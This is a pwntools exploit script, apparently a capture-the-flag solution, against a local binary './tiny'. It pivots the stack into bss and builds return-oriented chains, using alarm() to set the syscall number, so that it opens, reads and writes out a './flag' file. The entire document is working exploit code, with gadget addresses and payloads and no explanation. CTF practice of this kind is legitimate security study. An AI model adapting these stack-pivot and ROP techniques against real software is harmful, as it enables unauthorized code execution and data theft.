from pwn import *
context.log_level='debug'
context.terminal = ['/bin/tmux', 'split', '-h']
sh = process('./tiny')

bss =  0x405000-0x100
vul = 0x401070
alarm = 0x401055
syscall = 0x4010ad
pop_rdi = 0x401103
pop_rsi_r15 = 0x401101
'''
.text:0000000000401088                 mov     eax, 0
.text:000000000040108D                 mov     edx, 70h ; 'p'  ; count
.text:0000000000401092                 syscall                 ; LINUX - sys_read
'''

edi_0_edx_70_eax_0_syscall = 0x401083
#gdb.attach(sh)
#pause()
sh.recvuntil('pwned!')
payload = p64(0) + p64(bss+0x30)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(edi_0_edx_70_eax_0_syscall) #0x20  read(0,bss,0x70)

sh.send(payload)
sh.recvuntil('Bye')
bp_payload = b'./flag\x00\x00' + b'\x00'*0x28 + p64(vul) + p64(vul) + p64(vul)

sh.sendline(bp_payload)

payload = p64(0) + p64(bss + 0x70)
payload += p64(alarm) + p64(pop_rdi) + p64(bss) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(syscall) + p64(vul) #0x40  open(bss,0,0)
sleep(10) # rax = 2 open

sh.send(payload)

sh.recvuntil('Bye')
sh.recvuntil('Bye')
payload = p64(0) + p64(bss+0xa8)
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi_r15) + p64(bss-0x120) + p64(0) + p64(0x401088) + p64(vul) #0x30 read(3,bss-0x120,0x70)
sh.send(payload)
sleep(11)   # rax = 1  write
#gdb.attach(sh,'b *0x40106d')
sh.recvuntil('Bye')
payload = p64(0) + p64(bss)
payload += p64(alarm) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(bss-0x120) + p64(0) + p64(0x40108d) # write(1,bss-0x120,0x70)
sh.send(payload)
sh.interactive()
